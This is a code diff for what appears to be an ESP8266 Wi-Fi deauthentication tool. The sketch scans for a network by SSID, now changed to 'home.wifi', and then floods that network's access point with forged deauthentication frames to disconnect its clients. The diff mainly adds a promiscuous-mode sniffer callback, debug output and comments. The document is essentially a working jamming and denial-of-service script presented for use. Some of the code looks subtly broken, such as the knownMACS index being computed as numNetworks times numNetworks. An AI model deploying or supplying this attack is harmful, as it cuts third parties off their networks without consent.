@@ -22,24 +22,39 @@ uint8_t deauthPacket[26] = {
 /*24 - 25*/  0x01, 0x00  // Reason code 1 (no reason given)
 };
 
+void snifferCallback(uint8_t *buf, uint16_t len) {
+  Serial.println("Packet received!"); 
+}
+
 void setup() {
   Serial.begin(115200);
-  Serial.println();
+  Serial.println("");
   Serial.println("Deauthing GPhone");
   found = false;
 
   // Set WiFi to station mode and disconnect from any AP
-  WiFi.mode(WIFI_STA);
+  // WiFi.mode(WIFI_STA);
+  // wifi_promiscuous_enable(1);
+  // delay(100);
+
+  wifi_set_promiscuous_rx_cb(snifferCallback);
   wifi_promiscuous_enable(1);
+
   delay(100);
+  
+  Serial.printf("Free heap: %d bytes\n", ESP.getFreeHeap());
+
+  packetSize = sizeof(deauthPacket);
 
   packetSize = sizeof(deauthPacket);
 }
 
 void loop() {
-  if(!found){findNewNetworks();}
-  else{
-    ///Serial.println("Deauthing...");
+  if(!found){
+    Serial.println("Trying to find target...");
+    findNewNetworks();
+  }else{
+    Serial.println("Deauthing...");
     deauthAttack(targetMAC);
   }
   
@@ -63,13 +78,15 @@ void deauthAttack(uint8_t* apMac) {
   }
 }
 void findNewNetworks(){
-  uint8_t newNumNetworks = WiFi.scanNetworks();
+  uint8_t foundNetworks = WiFi.scanNetworks();
 
-  for (uint8_t i = 0; i < newNumNetworks; i++){
+  // loop all found networks
+  for (uint8_t i = 0; i < foundNetworks; i++){
     
     uint8_t* newMAC = WiFi.BSSID(i);
     bool newNetwork = true;
 
+    // if any found networks have been seen before
     for (uint8_t k = 0; k < numNetworks; k++){
       if(memcmp(newMAC, &(knownMACS[k*6]), 6) == 0){
         newNetwork = false;
@@ -77,13 +94,14 @@ void findNewNetworks(){
       }
     }
 
+    // new network confirmed, add to list of known networks
     if(newNetwork){
       if (numNetworks < NUMNET) {
           memcpy(&knownMACS[numNetworks * numNetworks], newMAC, 6);
           numNetworks++;
         }
 
-      if(WiFi.SSID(i) == "GPhone"){
+      if(WiFi.SSID(i) == "home.wifi"){
         Serial.println("Network found");
         Serial.printf("Mac Address: %s\n", WiFi.BSSIDstr(i).c_str());
         Serial.printf("Wifi Channel: %d\n", WiFi.channel(i));
